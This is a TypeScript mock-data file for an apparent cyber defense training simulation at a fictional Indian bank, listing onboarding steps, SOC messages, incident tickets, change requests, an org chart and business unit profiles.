  { id: 'welcome', title: 'Welcome to GFS', subtitle: 'Cyber Defense Internship Program', description: 'Welcome to Global Financial Services. You have been selected for the Cyber Defense Internship Program (CDIP-2025-BATCH-03), powered by ShadowXLab Academy.' },
  { id: 'verify', title: 'Verify Identity', subtitle: 'Employee Authentication', description: 'Your identity has been verified against GFS HR records. Your biometrics have been captured. You are cleared for building access at Hyderabad SOC.' },
  { id: 'hr-welcome', title: 'HR Welcome', subtitle: 'Human Resources — Bengaluru', description: 'Priya Sharma (HR Manager) welcomes you to GFS. Review your employment terms, benefits, and the GFS Employee Handbook.' },
  { id: 'accept', title: 'Accept Employment', subtitle: 'Digital Offer Letter', description: 'Review and accept your offer letter. Your role: Security Intern, Department: Cybersecurity Division, Location: Hyderabad SOC. Start date: Today.' },
  { id: 'security-awareness', title: 'Security Awareness', subtitle: 'Mandatory Training', description: 'Complete the GFS Security Awareness training. Topics: Clean desk, password policy, phishing, social engineering, USB policy, incident reporting. This is mandatory before system access.' },
  { id: 'employee-id', title: 'Employee ID', subtitle: 'Your GFS Identity', description: 'Your Employee ID has been generated: GFS-IN-SOC-4721. This ID is used for all GFS systems, building access, and badge identification.' },
  { id: 'laptop', title: 'Laptop Assignment', subtitle: 'Dell Latitude 5540', description: 'Your GFS laptop has been configured by IT. Pre-installed: CrowdStrike Falcon EDR, Microsoft Defender, GlobalProtect VPN, Microsoft 365. BitLocker encryption enabled. Serial: GFS-LT-2025-4721.' },
  { id: 'email', title: 'Email & Accounts', subtitle: 'intern4721@gfs.com', description: 'Your GFS email (intern4721@gfs.com) and Microsoft 365 account are active. Access to Outlook, Teams, SharePoint, and OneDrive. Your manager Suresh Reddy will add you to the SOC channels.' },
  { id: 'building-access', title: 'Building Access', subtitle: 'Hyderabad SOC — Tower B', description: 'Your Smart Card and access badge have been activated. You have access to: Building entrance, Floor 12 (SOC), Floor 11 (Training Center), Floor 3 (Cafeteria). PCI CDE access requires escort.' },
  { id: 'meet-manager', title: 'Meet Your Manager', subtitle: 'Suresh Reddy — Senior SOC Manager', description: 'Suresh Reddy greets you at the SOC. He explains your role, expectations, daily schedule, and introduces you to the team. You report to him for the next 4 months.' },
  { id: 'meet-team', title: 'Meet Your Team', subtitle: 'Hyderabad SOC Team', description: 'Your buddy Arjun Sharma (SOC Team Lead) introduces you to the team. Raghav, Ananya, and Meera welcome you. You observe the SOC floor and see real-time alerts on the dashboards.' },
  { id: 'explore', title: 'Explore GFS India', subtitle: '9 Cities, 420+ Branches', description: 'Tour GFS operations — Bengaluru HQ, Hyderabad SOC, Mumbai DC, Pune Cloud Ops, Chennai DR, Delhi, Kolkata, Ahmedabad, and Visakhapatnam. Understand the enterprise you protect.' },
];

export const MOCK_MESSAGES: InternalMessage[] = [
  {
    id: 'msg-001', from: 'Sarah Chen', fromRole: 'SOC Manager / CISO', to: 'Alex Morgan',
    subject: 'Welcome to the Team — First Week Assignments',
    body: 'Alex, welcome to the SOC team. I have assigned your first training modules in the CyberOps platform. Complete Enterprise Orientation and Network Security Operations this week. Reach out to Marcus or David if you have questions about any alert in the queue.',
    timestamp: new Date(Date.now() - 3600000).toISOString(), read: false, priority: 'high',
  },
  {
    id: 'msg-002', from: 'Marcus Williams', fromRole: 'Senior SOC Analyst — Tier 3', to: 'Alex Morgan',
    subject: 'RE: ALT-2024-8841 — You Should Look at This',
    body: 'Hey Alex, the Silk Typhoon data exfiltration alert is a great learning opportunity. Open the SOC Console, find ALT-2024-8841, and review the logs and timeline. Try to build a hypothesis about what happened. I will review your analysis tomorrow.',
    timestamp: new Date(Date.now() - 7200000).toISOString(), read: false, priority: 'normal',
  },
  {
    id: 'msg-003', from: 'David Kim', fromRole: 'SOC Analyst — Tier 1', to: 'Alex Morgan',
    subject: 'Quick Tips for Alert Triage',
    body: 'Welcome aboard! A few tips from a fellow analyst: always check the source IP reputation first, look at the MITRE mapping to understand the technique, and review the affected assets before making a triage decision. Let me know if you need help with the SOC Console.',
    timestamp: new Date(Date.now() - 10800000).toISOString(), read: true, priority: 'normal',
  },
  {
    id: 'msg-004', from: 'Priya Sharma', fromRole: 'Incident Responder', to: 'Alex Morgan',
    subject: 'Incident Response Training — Shadow Opportunity',
    body: 'Alex, we are coordinating the response to the multi-alert incident (the possible Silk Typhoon campaign). Sarah has approved you to shadow the IR process. Join the incident bridge at 14:00 in the IR War Room (Floor 34, Room B-3412).',
    timestamp: new Date(Date.now() - 14400000).toISOString(), read: false, priority: 'urgent',
  },
  {
    id: 'msg-005', from: 'IT Service Desk', fromRole: 'Automated Notification', to: 'All Cybersecurity Division',
    subject: 'Scheduled Maintenance — Splunk Cluster — Tonight 02:00-04:00',
    body: 'Planned maintenance window for the Splunk Enterprise cluster (10.0.100.10-14). During this window, search functionality will be unavailable. Sentinel and Falcon continue to operate normally. All forwarded logs will be queued and indexed after maintenance.',
    timestamp: new Date(Date.now() - 18000000).toISOString(), read: true, priority: 'normal',
  },
];

export const MOCK_TICKETS: Ticket[] = [
  {
    id: 'INC-2024-15847', title: 'Potential Data Exfiltration — FS-APP-PROD-03', type: 'incident',
    status: 'in-progress', priority: 'p1-critical', assignee: 'Unassigned', reporter: 'SIEM Automated',
    created: new Date(Date.now() - 180000).toISOString(), updated: new Date(Date.now() - 60000).toISOString(),
    description: 'ALT-2024-8841 escalated. Large outbound data transfer to known C2 infrastructure.',
    category: 'Data Exfiltration',
  },
  {
    id: 'INC-2024-15846', title: 'Ransomware Detection — WRK-LOAN-047', type: 'incident',
    status: 'in-progress', priority: 'p1-critical', assignee: 'Marcus Williams', reporter: 'CrowdStrike Falcon',
    created: new Date(Date.now() - 420000).toISOString(), updated: new Date(Date.now() - 120000).toISOString(),
    description: 'ALT-2024-8840 — Ransomware behavior detected. Device isolated. Investigation ongoing.',
    category: 'Ransomware',
  },
  {
    id: 'INC-2024-15845', title: 'Brute Force — svc-integration Account', type: 'incident',
    status: 'in-progress', priority: 'p2-high', assignee: 'David Kim', reporter: 'Azure AD Protection',
    created: new Date(Date.now() - 900000).toISOString(), updated: new Date(Date.now() - 300000).toISOString(),
    description: 'ALT-2024-8839 — 847 failed login attempts with impossible travel. Account disabled pending investigation.',
    category: 'Credential Compromise',
  },
  {
    id: 'CHG-2024-8891', title: 'Emergency Patch — CVE-2024-38077 (RDP RCE)', type: 'change-request',
    status: 'approved', priority: 'p1-critical', assignee: 'Li Wei', reporter: 'Vulnerability Management',
    created: new Date(Date.now() - 3600000).toISOString(), updated: new Date(Date.now() - 1800000).toISOString(),
    description: 'Emergency change to patch Remote Code Execution vulnerability affecting 8 production servers.',
    category: 'Emergency Change',
  },
  {
    id: 'SR-2024-22134', title: 'Access Request — New SOC Intern (Alex Morgan)', type: 'service-request',
    status: 'resolved', priority: 'p3-medium', assignee: 'IT Service Desk', reporter: 'Sarah Chen',
    created: new Date(Date.now() - 86400000).toISOString(), updated: new Date(Date.now() - 43200000).toISOString(),
    description: 'Provision SOC analyst access for new employee. Sentinel read access, Falcon console access, ServiceNow analyst role.',
    category: 'Access Provisioning',
  },
];

export const MOCK_CHANGES: ChangeRequest[] = [
  {
    id: 'CHG-2024-8891', title: 'Emergency Patch — CVE-2024-38077 (RDP RCE)', type: 'emergency',
    status: 'approved', changeManager: 'Ben Nakamura', requester: 'Vulnerability Management',
    risk: 'high', plannedDate: new Date(Date.now() + 7200000).toISOString(),
    description: 'Apply Microsoft security update KB5034765 to 8 production application servers to remediate Remote Code Execution vulnerability in RDP.',
    justification: 'CVSS 9.8 — Unauthenticated RCE. Exploited in the wild. Affects 8 GFS production servers in the application tier.',
    rollbackPlan: 'Restore from pre-patch snapshot (Veeam). RTO: 30 minutes per server. Rollback window: 4 hours post-deployment.',
    affectedSystems: ['APP-LOAN-02', 'APP-CARDS-01', 'APP-RETAIL-03', 'APP-CORP-02', 'APP-TREASURY-01', 'APP-INSURANCE-02', 'APP-DIGITAL-04', 'APP-SUPPORT-01'],
  },
  {
    id: 'CHG-2024-8890', title: 'Firewall Rule Update — Block Silk Typhoon IPs', type: 'emergency',
    status: 'implemented', changeManager: 'Carlos Mendes', requester: 'SOC',
    risk: 'medium', plannedDate: new Date(Date.now() - 3600000).toISOString(),
    description: 'Block 47 IP addresses associated with Silk Typhoon APT infrastructure at the perimeter firewall.',
    justification: 'Active threat campaign targeting GFS. IPs confirmed as C2 infrastructure by multiple TI sources.',
    rollbackPlan: 'Remove blocked IP entries from Palo Alto address groups via Panorama.',
    affectedSystems: ['Palo Alto PA-7080 Cluster', 'Panorama'],
  },
];

export const MOCK_ACTIVITY: ActivityEvent[] = [
  { id: 'evt-001', timestamp: new Date(Date.now() - 60000).toISOString(), type: 'alert', message: 'Critical alert ALT-2024-8841 triggered: Potential data exfiltration on FS-APP-PROD-03', severity: 'critical' },
  { id: 'evt-002', timestamp: new Date(Date.now() - 180000).toISOString(), type: 'investigation', message: 'Marcus Williams opened investigation INV-2024-334 for ransomware behavior on WRK-LOAN-047', severity: 'high', user: 'Marcus Williams' },
  { id: 'evt-003', timestamp: new Date(Date.now() - 300000).toISOString(), type: 'scan', message: 'Qualys vulnerability scan completed for subnet 10.0.40.0/24 — 2 critical, 7 high, 14 medium findings', severity: 'info' },
  { id: 'evt-004', timestamp: new Date(Date.now() - 420000).toISOString(), type: 'change', message: 'Emergency change CHG-2024-8891 approved: Patching CVE-2024-38077 across 8 production servers', severity: 'high' },
  { id: 'evt-005', timestamp: new Date(Date.now() - 600000).toISOString(), type: 'system', message: 'AKS Production cluster — 12 pods in payments service experiencing scaling issues', severity: 'medium' },
  { id: 'evt-006', timestamp: new Date(Date.now() - 720000).toISOString(), type: 'user', message: 'David Kim escalated alert ALT-2024-8839 (brute force) to Tier 2 SOC', severity: 'high', user: 'David Kim' },
  { id: 'evt-007', timestamp: new Date(Date.now() - 900000).toISOString(), type: 'deployment', message: 'Firewall rule update deployed: 47 Silk Typhoon IPs added to block list', severity: 'info' },
  { id: 'evt-008', timestamp: new Date(Date.now() - 1200000).toISOString(), type: 'alert', message: 'Medium alert: DNS tunneling pattern detected — 12,847 queries to ddns-provider.net', severity: 'medium' },
  { id: 'evt-009', timestamp: new Date(Date.now() - 1500000).toISOString(), type: 'investigation', message: 'Priya Sharma contained WRK-CARDS-012 — device isolated, malware quarantined', severity: 'high', user: 'Priya Sharma' },
  { id: 'evt-010', timestamp: new Date(Date.now() - 1800000).toISOString(), type: 'meeting', message: 'Shift handover completed: Night Shift → Day Shift — 3 open investigations transferred', severity: 'info', user: 'SOC Shift Lead' },
  { id: 'evt-011', timestamp: new Date(Date.now() - 2100000).toISOString(), type: 'user', message: 'Alex Morgan (new hire) onboarded to CyberOps platform — access provisioned', severity: 'info', user: 'IT Service Desk' },
  { id: 'evt-012', timestamp: new Date(Date.now() - 2400000).toISOString(), type: 'alert', message: 'Low alert: Unauthorized USB device blocked on WRK-TREASURY-023', severity: 'low' },
];



// ============================================================
// ORGANIZATIONAL CHART
// ============================================================

export interface OrgNode {
  id: string;
  name: string;
  title: string;
  department: string;
  location: string;
  avatarInitials: string;
  avatarColor: string;
  reportsTo?: string;
  directReports: string[];
  description: string;
  responsibilities: string[];
  tools: string[];
  careerPath: string[];
}

export const ORG_CHART: OrgNode[] = [
  {
    id: 'org-board', name: 'GFS Board of Directors', title: 'Board of Directors', department: 'Board', location: 'Bengaluru',
    avatarInitials: 'BD', avatarColor: 'linear-gradient(135deg, #1e293b, #334155)',
    directReports: ['org-ceo'], description: 'Provides strategic oversight and governance for Global Financial Services. Comprises independent directors, executive directors, and RBI-nominated directors.',
    responsibilities: ['Strategic direction', 'Risk oversight', 'Regulatory compliance', 'Shareholder value', 'Executive appointments'],
    tools: ['Board Portal', 'Risk Dashboards', 'Audit Reports'], careerPath: [],
  },
  {
    id: 'org-ceo', name: 'Rajesh Sharma', title: 'Chief Executive Officer', department: 'Executive', location: 'Bengaluru',
    avatarInitials: 'RS', avatarColor: 'linear-gradient(135deg, #f59e0b, #d97706)',
    reportsTo: 'org-board', directReports: ['org-coo', 'org-cfo', 'org-cto', 'org-ciso', 'org-chro'],
    description: 'Leads GFS India operations across 9 cities with 42,000+ employees. Reports to the Board. Responsible for overall business strategy, regulatory relationships with RBI, and stakeholder management.',
    responsibilities: ['Business strategy', 'RBI relationship', 'Board reporting', 'P&L oversight', 'Regulatory compliance'],
    tools: ['Executive Dashboard', 'Board Portal', 'Strategic Planning'], careerPath: [],
  },
  {
    id: 'org-cto', name: 'Arun Kulkarni', title: 'Chief Technology Officer', department: 'Technology', location: 'Pune',
    avatarInitials: 'AK', avatarColor: 'linear-gradient(135deg, #3b82f6, #2563eb)',
    reportsTo: 'org-ceo', directReports: ['org-vp-infra', 'org-vp-apps', 'org-vp-cloud'],
    description: 'Leads all technology operations including infrastructure, application development, cloud operations, and enterprise architecture across GFS India.',
    responsibilities: ['Technology strategy', 'Infrastructure', 'Application development', 'Cloud operations', 'Architecture'],
    tools: ['Azure DevOps', 'Jira', 'Architecture Tools', 'Cloud Console'], careerPath: [],
  },
  {
    id: 'org-ciso', name: 'Anand Iyer', title: 'Chief Information Security Officer', department: 'Cybersecurity Division', location: 'Hyderabad',
    avatarInitials: 'AI', avatarColor: 'linear-gradient(135deg, #00e5c7, #059669)',
    reportsTo: 'org-ceo', directReports: ['org-soc-director', 'org-risk-mgr', 'org-compliance-ho', 'org-vp-offensive'],
    description: 'Leads the Cybersecurity Division of 420+ professionals. Responsible for the security posture of all GFS systems, regulatory compliance (RBI, PCI DSS, IT Act), and cyber risk management.',
    responsibilities: ['Security strategy', 'Risk management', 'Compliance', 'Incident oversight', 'Board reporting', 'RBI liaison'],
    tools: ['Sentinel', 'GRC Platform', 'Risk Dashboard', 'Compliance Portal'], careerPath: [],
  },
  {
    id: 'org-soc-director', name: 'Prakash Kulkarni', title: 'SOC Director', department: 'Security Operations Center', location: 'Hyderabad',
    avatarInitials: 'PK', avatarColor: 'linear-gradient(135deg, #10b981, #059669)',
    reportsTo: 'org-ciso', directReports: ['org-soc-mgr', 'org-ir-lead', 'org-ti-lead', 'org-eng-lead'],
    description: 'Directs 24/7 security operations across all GFS India locations. Manages SOC analysts across three shifts, coordinates with Fraud Operations, and reports security posture to CISO.',
    responsibilities: ['SOC operations', 'Shift management', 'Escalation', 'Metrics', 'Staff development', 'Tool optimization'],
    tools: ['Sentinel', 'ServiceNow SIR', 'Falcon', 'Splunk'], careerPath: [],
  },
  {
    id: 'org-soc-mgr', name: 'Suresh Reddy', title: 'Senior SOC Manager', department: 'Security Operations Center', location: 'Hyderabad',
    avatarInitials: 'SR', avatarColor: 'linear-gradient(135deg, #00e5c7, #3b8bf5)',
    reportsTo: 'org-soc-director', directReports: ['org-team-lead', 'org-soc-analysts'],
    description: 'Manages Day Shift and Evening Shift SOC operations. Directly supervises the SOC team lead, analysts, and interns. Reviews all P1 and P2 incidents. Coordinates with IR team for major incidents.',
    responsibilities: ['Shift oversight', 'Alert review', 'Staff mentoring', 'Incident coordination', 'KPI tracking', 'Intern management'],
    tools: ['Sentinel', 'Falcon', 'ServiceNow', 'KQL', 'Splunk'], careerPath: [],
  },
  {
    id: 'org-team-lead', name: 'Arjun Sharma', title: 'SOC Team Lead — Tier 2/3', department: 'Security Operations Center', location: 'Hyderabad',
    avatarInitials: 'AS', avatarColor: 'linear-gradient(135deg, #f0a830, #f04848)',
    reportsTo: 'org-soc-mgr', directReports: ['org-analyst-t2-1', 'org-analyst-t1'],
    description: 'Leads Tier 2/3 investigation team. Handles complex escalations, coordinates threat hunts, and mentors junior analysts and interns.',
    responsibilities: ['Escalation handling', 'Threat hunting', 'Mentoring', 'Investigation coordination', 'Shift handover'],
    tools: ['Sentinel', 'Falcon', 'Wireshark', 'KQL', 'YARA'], careerPath: [],
  },
  {
    id: 'org-ir-lead', name: 'Sai Krishna', title: 'Incident Response Lead', department: 'Incident Response', location: 'Hyderabad',
    avatarInitials: 'SK', avatarColor: 'linear-gradient(135deg, #a78bfa, #ec4899)',
    reportsTo: 'org-soc-director', directReports: [],
    description: 'Leads incident response for major security events. Coordinates cross-functional response including legal, PR, and business stakeholders. Manages forensics capability.',
    responsibilities: ['Incident command', 'IR coordination', 'Forensics', 'Post-mortem', 'Tabletop exercises', 'CERT-In liaison'],
    tools: ['Volatility', 'Autopsy', 'Falcon IR', 'Encase', 'KAPE'], careerPath: [],
  },
  {
    id: 'org-ti-lead', name: 'Harsha Vardhan', title: 'Threat Hunting Lead', department: 'Threat Intelligence', location: 'Hyderabad',
    avatarInitials: 'HV', avatarColor: 'linear-gradient(135deg, #30d98a, #00e5c7)',
    reportsTo: 'org-soc-director', directReports: ['org-ti-analyst'],
    description: 'Leads proactive threat hunting operations and manages the threat intelligence program. Coordinates with RBI CERT-In and Indian Financial ISAC for threat sharing.',
    responsibilities: ['Threat hunting', 'TI program', 'IOC management', 'APT tracking', 'ISAC coordination', 'Hypothesis development'],
    tools: ['MISP', 'Recorded Future', 'Sentinel Hunting', 'Splunk', 'MITRE ATT&CK'], careerPath: [],
  },
  {
    id: 'org-eng-lead', name: 'Aditya Kulkarni', title: 'Cloud & Security Engineering Lead', department: 'Security Engineering', location: 'Pune',
    avatarInitials: 'AD', avatarColor: 'linear-gradient(135deg, #3b8bf5, #a78bfa)',
    reportsTo: 'org-soc-director', directReports: ['org-eng-win', 'org-eng-linux', 'org-eng-cloud'],
    description: 'Leads security engineering across cloud, Windows, and Linux platforms. Implements security controls, hardening standards, and automation across the GFS technology estate.',
    responsibilities: ['Security engineering', 'Cloud security', 'Hardening', 'Automation', 'Architecture', 'Tool deployment'],
    tools: ['Azure', 'AWS', 'Terraform', 'Ansible', 'CrowdStrike', 'Vault'], careerPath: [],
  },
  {
    id: 'org-risk-mgr', name: 'Anil Verma', title: 'Enterprise Risk Manager', department: 'Risk & Compliance', location: 'Bengaluru',
    avatarInitials: 'AV', avatarColor: 'linear-gradient(135deg, #f0a830, #f59e0b)',
    reportsTo: 'org-ciso', directReports: [],
    description: 'Manages enterprise cyber risk assessment, risk quantification, and risk reporting to the Board Risk Committee and RBI.',
    responsibilities: ['Risk assessment', 'Risk quantification', 'Board reporting', 'Risk register', 'Third-party risk'],
    tools: ['GRC Platform', 'Risk Dashboard', 'Excel', 'PowerPoint'], careerPath: [],
  },
  {
    id: 'org-compliance-ho', name: 'Deepa Nair', title: 'Chief Compliance Officer', department: 'Compliance & Regulatory', location: 'Bengaluru',
    avatarInitials: 'DN', avatarColor: 'linear-gradient(135deg, #ec4899, #a78bfa)',
    reportsTo: 'org-ciso', directReports: ['org-compliance-analyst'],
    description: 'Ensures GFS complies with all regulatory requirements including RBI cybersecurity framework, PCI DSS, IT Act 2000, DPDP Act, and CERT-In guidelines.',
    responsibilities: ['Regulatory compliance', 'Audit management', 'Policy framework', 'CERT-In reporting', 'RBI submissions'],
    tools: ['Compliance Portal', 'ServiceNow', 'Audit Management'], careerPath: [],
  },
  {
    id: 'org-vp-offensive', name: 'Nikhil Joshi', title: 'VAPT Lead', department: 'Offensive Security', location: 'Hyderabad',
    avatarInitials: 'NJ', avatarColor: 'linear-gradient(135deg, #f04848, #f0a830)',
    reportsTo: 'org-ciso', directReports: [],
    description: 'Leads vulnerability assessment and penetration testing across all GFS applications, infrastructure, and cloud environments.',
    responsibilities: ['VAPT program', 'Penetration testing', 'Web app testing', 'Cloud testing', 'Purple teaming'],
    tools: ['Burp Suite', 'Nessus', 'Qualys', 'Metasploit', 'Nmap', 'SQLMap'], careerPath: [],
  },
];

// ============================================================
// BUSINESS UNITS
// ============================================================

export interface BusinessUnit {
  id: string;
  name: string;
  icon: string;
  color: string;
  head: string;
  headTitle: string;
  location: string;
  employees: number;
  customers: string;
  revenue: string;
  description: string;
  criticalApps: string[];
  criticalData: string[];
  securityImportance: string;
  commonThreats: string[];
  infrastructure: string[];
  dailyTransactions: string;
}

export const BUSINESS_UNITS: BusinessUnit[] = [
  {
    id: 'bu-retail', name: 'Retail Banking', icon: '🏦', color: 'var(--color-gfs-accent)',
    head: 'Sunil Mehta', headTitle: 'Head of Retail Banking', location: 'Bengaluru', employees: 9200,
    customers: '5.2 Crore accounts', revenue: '₹18,400 Cr annual', dailyTransactions: '₹8,200 Cr daily',
    description: 'Manages savings accounts, current accounts, fixed deposits, recurring deposits, and branch operations across 420+ branches. Core revenue driver for GFS India.',
    criticalApps: ['Core Banking (FIS Profile)', 'CBS Mobile', 'Branch CRM', 'Document Management', 'Customer 360'],
    criticalData: ['Customer PII (Aadhaar, PAN)', 'Account balances', 'Transaction history', 'KYC documents', 'Loan data'],
    securityImportance: 'Stores data for 5.2 crore customers. Any breach triggers mandatory RBI reporting and potential license suspension.',
    commonThreats: ['Phishing', 'ATM skimming', 'Social engineering', 'Insider fraud', 'Ransomware', 'Credential theft'],
    infrastructure: ['Core Banking (Mumbai DC)', 'Branch network (420+)', 'ATM network (2,800+)', 'Internet Banking', 'Mobile Banking'],
  },
  {
    id: 'bu-upi', name: 'UPI Payments', icon: '📱', color: 'var(--color-gfs-blue)',
    head: 'Pooja Sharma', headTitle: 'Head of Cards & Payments', location: 'Hyderabad', employees: 3200,
    customers: '3.8 Crore VPA holders', revenue: '₹2,400 Cr annual', dailyTransactions: '1.8 Crore txns/day',
    description: 'Operates GFS UPI payment gateway processing 1.8 crore transactions daily via NPCI. Supports VPA resolution, QR payments, collect requests, and auto-pay mandates.',
    criticalApps: ['UPI Gateway (GFS-UPI-PROD)', 'VPA Registry', 'Fraud Detection ML', 'QR Management', 'Auto-Pay Engine'],
    criticalData: ['VPA mappings', 'Transaction records', 'Device fingerprints', 'Fraud scores', 'Merchant data'],
    securityImportance: 'UPI fraud costs Indian banks ₹300+ crore annually. GFS UPI gateway is a prime target for organized fraud rings.',
    commonThreats: ['UPI fraud (mule accounts)', 'VPA spoofing', 'SIM swap attacks', 'QR code tampering', 'Social engineering', 'API abuse'],
    infrastructure: ['UPI Gateway (Hyderabad)', 'NPCI UPI Switch', 'Fraud ML Engine', 'Redis Cache', 'Kafka Queue'],
  },
  {
    id: 'bu-neft', name: 'NEFT / RTGS', icon: '🏛️', color: 'var(--color-gfs-purple)',
    head: 'Harsha Vardhan Reddy', headTitle: 'Head of Treasury Operations', location: 'Mumbai', employees: 520,
    customers: 'All GFS account holders + interbank', revenue: '₹45,000 Cr daily throughput', dailyTransactions: '4.5 Lakh NEFT + 28,000 RTGS/day',
    description: 'Operates NEFT batch settlement and RTGS real-time gross settlement connecting to RBI. Processes interbank transfers, corporate payments, and government transactions.',
    criticalApps: ['NEFT Gateway', 'RTGS Gateway', 'SWIFT Alliance Lite2', 'Settlement Reconciliation', 'HSM (Thales)'],
    criticalData: ['NEFT/RTGS transaction logs', 'SWIFT messages', 'IFSC codes', 'Settlement data', 'Reconciliation records'],
    securityImportance: 'Unauthorized transfers could move crores in seconds. SWIFT compromise has been used globally (Bangladesh Bank heist). RBI mandates real-time monitoring.',
    commonThreats: ['SWIFT credential theft', 'Transaction manipulation', 'Insider fraud', 'Session hijacking', 'Man-in-the-middle', 'Business logic abuse'],
    infrastructure: ['NEFT/RTGS Gateway (Mumbai DC)', 'SWIFT Alliance Lite2', 'HSM (Thales)', 'PCI CDE', 'Treasury systems'],
  },
  {
    id: 'bu-cards', name: 'Credit & Debit Cards', icon: '💳', color: 'var(--color-gfs-amber)',
    head: 'Pooja Sharma', headTitle: 'Head of Cards & Payments', location: 'Hyderabad', employees: 2800,
    customers: '1.4 Crore active cards', revenue: '₹3,600 Cr annual', dailyTransactions: '14 Million card txns/day',
    description: 'Manages credit card issuance, debit card operations, card fraud prevention, merchant acquiring, and POS network across 12 lakh merchants.',
    criticalApps: ['Card Management System', 'Fraud Detection (Real-time)', 'POS Network', 'Merchant Portal', 'Card Control App'],
    criticalData: ['Card numbers (PAN)', 'CVV', 'Cardholder data', 'Transaction records', 'Merchant data', 'EMV keys'],
    securityImportance: 'PCI DSS Level 1 compliance mandatory. Card data breach can result in ₹100+ crore fines and loss of card processing privileges.',
    commonThreats: ['Card skimming', 'Card-not-present fraud', 'BIN attacks', 'ATM malware', 'Phishing', 'Data exfiltration'],
    infrastructure: ['Card Processing (Hyderabad)', 'PCI CDE (Mumbai DC)', 'POS Network', 'ATM Network (2,800+)', 'Card Control APIs'],
  },
  {
    id: 'bu-digital', name: 'Digital Banking', icon: '🌐', color: 'var(--color-gfs-green)',
    head: 'Anil Kumar', headTitle: 'Chief Digital Officer', location: 'Bengaluru', employees: 2400,
    customers: '42 Lakh active users', revenue: '₹1,800 Cr annual', dailyTransactions: '₹3,200 Cr daily',
    description: 'Operates the GFS mobile banking app, Internet Banking portal, chatbot banking, and fintech partnerships. Responsible for digital transformation initiatives.',
    criticalApps: ['Mobile Banking App (React Native)', 'Internet Banking (Angular)', 'Chatbot Engine', 'API Gateway', 'Notification Service'],
    criticalData: ['Session tokens', 'Device bindings', 'Biometric data', 'App analytics', 'API keys'],
    securityImportance: 'Customer-facing application. SQL injection, API abuse, or session hijacking could directly impact millions of customers.',
    commonThreats: ['SQL injection', 'API abuse', 'Session hijacking', 'Mobile app reverse engineering', 'Man-in-the-middle', 'Phishing'],
    infrastructure: ['Internet Banking (Hyderabad DMZ)', 'Mobile Backend (Azure India)', 'API Gateway', 'CDN', 'OTP Gateway (Gupshup)'],
  },
  {
    id: 'bu-loans', name: 'Loans & Advances', icon: '📋', color: 'var(--color-gfs-accent)',
    head: 'Deepak Nair', headTitle: 'Head of Loans & Advances', location: 'Mumbai', employees: 4100,
    customers: '38 Lakh loan accounts', revenue: '₹12,600 Cr annual', dailyTransactions: '₹400 Cr monthly disbursements',
    description: 'Manages home loans, car loans, personal loans, education loans, and business loans. Handles loan origination, processing, disbursal, and recovery.',
    criticalApps: ['Loan Origination System', 'Loan Management System', 'Credit Bureau Integration', 'Document Vault', 'Collections Engine'],
    criticalData: ['Applicant PII', 'Income documents', 'Property documents', 'CIBIL scores', 'Loan agreements', 'Disbursal records'],
    securityImportance: 'Handles sensitive financial data during loan processing. Document manipulation or unauthorized disbursement could cause massive losses.',
    commonThreats: ['Data exfiltration', 'Document forgery', 'Insider fraud', 'Ransomware', 'Credential theft', 'API abuse'],
    infrastructure: ['Loan Processing Servers (Mumbai DC)', 'Document Vault', 'CIBIL Integration', 'DFS Share', 'Core Banking Link'],
  },
  {
    id: 'bu-corporate', name: 'Corporate Banking', icon: '🏢', color: 'var(--color-gfs-blue)',
    head: 'Ravi Shankar Prasad', headTitle: 'Head of Corporate Banking', location: 'Mumbai', employees: 3800,
    customers: '18,000 corporate clients', revenue: '₹8,700 Cr annual', dailyTransactions: '₹28,000 Cr daily',
    description: 'Provides corporate lending, trade finance, cash management, and institutional services to large enterprises and government entities.',
    criticalApps: ['Corporate Internet Banking', 'Trade Finance Platform', 'Cash Management', 'Lending Suite', 'SWIFT Gateway'],
    criticalData: ['Corporate account data', 'Trade documents', 'SWIFT credentials', 'Deal information', 'M&A data'],
    securityImportance: 'Handles high-value transactions. SWIFT credentials are targeted by sophisticated threat actors. M&A data is material non-public information.',
    commonThreats: ['Business Email Compromise', 'SWIFT attacks', 'Data exfiltration', 'Insider threats', 'Supply chain attacks', 'Advanced persistent threats'],
    infrastructure: ['Corporate Banking (Mumbai)', 'SWIFT Gateway', 'Trade Finance Platform', 'Corporate VPN', 'Deal Room'],
  },
  {
    id: 'bu-treasury', name: 'Treasury & Investment', icon: '💹', color: 'var(--color-gfs-amber)',
    head: 'Harsha Vardhan Reddy', headTitle: 'Chief Investment Officer', location: 'Mumbai', employees: 520,
    customers: 'GFS institutional portfolio', revenue: '₹3,800 Cr annual returns', dailyTransactions: '₹1,200 Cr daily trades',
    description: 'Manages GFS investment portfolio, liquidity operations, forex trading, government securities, and risk hedging. Connected to NSE, BSE, and CCIL.',
    criticalApps: ['Treasury Management System', 'Forex Trading Platform', 'Risk Analytics', 'CCIL Integration', 'Bloomberg Terminal'],
    criticalData: ['Trading positions', 'Investment data', 'Forex rates', 'Counterparty data', 'Deal information'],
    securityImportance: 'Trading floor compromise could manipulate positions or execute unauthorized trades. DNS tunneling from Treasury workstation indicates active reconnaissance.',
    commonThreats: ['Trading manipulation', 'Data exfiltration', 'DNS tunneling', 'Insider trading risks', 'Market manipulation', 'Advanced persistent threats'],
    infrastructure: ['Treasury Floor (Mumbai)', 'Trading Platforms', 'Bloomberg Terminal', 'NSE/BSE Links', 'CCIL Settlement'],
  },
  {
    id: 'bu-fraud', name: 'Fraud Prevention', icon: '🛡️', color: 'var(--color-gfs-red)',
    head: 'Vikram Singh', headTitle: 'Head of Fraud Operations', location: 'Hyderabad', employees: 240,
    customers: 'All GFS customers', revenue: '₹47.2 Lakh blocked today', dailyTransactions: 'Real-time monitoring of 1.8 Cr UPI + 14M card txns',
    description: 'Operates real-time fraud detection across UPI, NEFT, RTGS, cards, and Internet Banking. Uses ML models, rule engines, and manual investigation to prevent fraud.',
    criticalApps: ['Fraud Detection ML Platform', 'Rules Engine', 'Case Management', 'Mule Account Detection', 'Device Fingerprinting'],
    criticalData: ['Fraud patterns', 'Blacklisted accounts', 'Mule account lists', 'Transaction risk scores', 'Investigation records'],
    securityImportance: 'Last line of defense against financial fraud. ₹300+ crore lost annually across Indian banking to UPI fraud alone.',
    commonThreats: ['UPI mule accounts', 'Card fraud', 'Identity theft', 'SIM swap', 'Social engineering', 'Account takeover'],
    infrastructure: ['Fraud Detection Platform (Hyderabad)', 'ML Models', 'Rules Engine', 'Real-time Stream Processing', 'NPCI Integration'],
  },
];

// ============================================================
// EMPLOYEE DIRECTORY
// ============================================================

export interface EmployeeProfile {
  id: string;
  employeeId: string;
  name: string;
  avatarInitials: string;
  avatarColor: string;
  department: string;
  team: string;
  title: string;
  manager: string;
  location: string;
  email: string;
  phone: string;
